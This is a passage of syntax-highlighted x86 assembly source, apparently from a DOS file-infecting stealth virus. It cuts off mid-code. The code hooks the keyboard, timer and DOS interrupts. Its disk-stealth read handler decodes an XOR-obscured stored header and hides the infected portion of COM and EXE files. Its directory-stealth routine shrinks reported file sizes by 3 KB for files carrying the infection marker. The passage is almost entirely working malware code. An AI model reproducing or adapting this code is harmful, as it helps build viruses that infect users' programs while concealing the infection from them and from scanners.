                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_key</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)-(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldh</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)-(</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">org21</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">09h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">09h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_rout</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmr_rout</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ni21</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">retf</span><span class="sc0">


</span><span class="sc1">;≥›€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€              Disk Stealth:  Read from handle (Int 21h,3Fh)             €ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€ﬁ≥</span><span class="sc0">
</span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_handle</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_bytes</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">j_dso1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">j_dso0</span><span class="sc0">
</span><span class="sc5">j_dso1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">j_dso3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">j_dso0</span><span class="sc0">
</span><span class="sc5">j_dso3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">phocked</span><span class="sc0">

</span><span class="sc5">j_dso0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_b1</span><span class="sc0">
</span><span class="sc5">read_b2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">done_it</span><span class="sc0">
</span><span class="sc5">read_b1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">read_b2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">11</span><span class="sc0">
                </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">read_b2</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">1Bh</span><span class="sc4">],</span><span class="sc12">'CP'</span><span class="sc0"> </span><span class="sc1">;[X_sig]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">read_b2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">1Bh</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'BB'</span><span class="sc0"> </span><span class="sc1">;[X_sig+2]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">read_b2</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">header</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">decr_l8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'EL'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'AH'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'W&amp;'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'HS'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'IF'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decr_l8b</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">vid4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">23</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">

                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">vid4</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">stat2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">_bytes</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">vid5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">vid5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">stealth1st</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">vid4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;[x_size]</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">val_len</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">val_len</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">vid2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_bytes</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">done_it</span><span class="sc0">
</span><span class="sc5">vid2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">vid3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">vid3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_bytes</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">done_it</span><span class="sc0">
</span><span class="sc5">vid3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">val_len</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">val_len</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">_bytes</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">vid</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_bytes</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">done_it</span><span class="sc0">

</span><span class="sc5">vid</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">done_it</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">done_it</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">_bytes</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">done_it</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;restore SFT data's</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">phocked</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_bytes</span><span class="sc0">            </span><span class="sc1">;change CX (if of any use)</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;return</span><span class="sc0">


</span><span class="sc1">;≥›€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€                               DIR Stealth                              €ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€ﬁ≥</span><span class="sc0">

</span><span class="sc5">stealth_dir_handle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">done_stealthing_handle</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">sec</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">done_stealthing_handle</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">done_stealthing_handle</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">done_stealthing_handle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">done_stealthing_fcb</span><span class="sc0">

</span><span class="sc5">stealth_dir_fcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">;extended fcb?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_ext_fcb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">no_ext_fcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">sec</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">done_stealthing_fcb</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
